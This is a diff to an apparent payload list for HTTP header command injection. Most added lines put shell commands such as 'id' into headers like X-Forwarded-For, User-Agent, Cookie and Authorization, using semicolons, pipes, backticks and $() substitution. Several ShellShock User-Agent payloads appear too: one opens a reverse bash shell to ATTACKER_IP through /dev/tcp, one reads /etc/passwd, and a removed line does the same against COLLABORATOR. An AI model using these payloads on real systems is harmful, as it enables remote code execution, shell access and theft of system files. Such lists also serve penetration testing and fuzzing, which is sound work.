@@ -1,3 +1,62 @@
-User-Agent: () { ignored; }; /bin/bash -i >& /dev/tcp/COLLABORATOR/4444 0>&1 (ShellShock)
-Referer: ;id
-X-Custom: ;id
+X-Forwarded-For: 127.0.0.1; id
+X-Forwarded-For: 127.0.0.1 | id
+X-Forwarded-For: 127.0.0.1`id`
+X-Forwarded-For: 127.0.0.1$(id)
+X-Real-IP: 127.0.0.1; id
+X-Real-IP: 127.0.0.1 | id
+X-Client-IP: 127.0.0.1; id
+X-Remote-IP: 127.0.0.1; id
+X-Remote-Addr: 127.0.0.1; id
+X-Host: 127.0.0.1; id
+Host: 127.0.0.1; id
+User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+User-Agent: () { :;}; echo; /bin/bash -c 'id'
+User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
+User-Agent: ; id
+User-Agent: | id
+User-Agent: `id`
+User-Agent: $(id)
+Referer: ; id
+Referer: | id
+Referer: `id`
+Referer: $(id)
+X-Custom-Header: ; id
+X-Custom-Header: | id
+X-Custom-Header: `id`
+X-Custom-Header: $(id)
+Cookie: name=; id
+Cookie: name=| id
+Cookie: name=`id`
+Cookie: name=$(id)
+Accept-Language: en; id
+Accept-Language: en | id
+Accept-Language: en`id`
+Accept: text/html; id
+Accept: */*, id
+Content-Type: application/json; id
+Content-Type: multipart/form-data; boundary=; id
+Authorization: Bearer ; id
+Authorization: Basic ; id
+X-Api-Key: ; id
+X-Api-Key: | id
+X-Api-Key: `id`
+X-Api-Key: $(id)
+X-Auth-Token: ; id
+X-Auth-Token: | id
+CF-Connecting-IP: 127.0.0.1; id
+True-Client-IP: 127.0.0.1; id
+X-Forwarded-Host: 127.0.0.1; id
+X-Original-URL: ; id
+X-Rewrite-URL: ; id
+X-ProxyUser-Ip: 127.0.0.1; id
+Via: 1.1 127.0.0.1; id
+Forwarded: for=127.0.0.1; id
+X-Originating-IP: 127.0.0.1; id
+X-Cluster-Client-IP: 127.0.0.1; id
+Pragma: ; id
+Cache-Control: no-cache; id
+Transfer-Encoding: chunked; id
+X-HTTP-Method-Override: ; id
+X-Method-Override: ; id
+Connection: keep-alive; id
+Origin: http://127.0.0.1; id
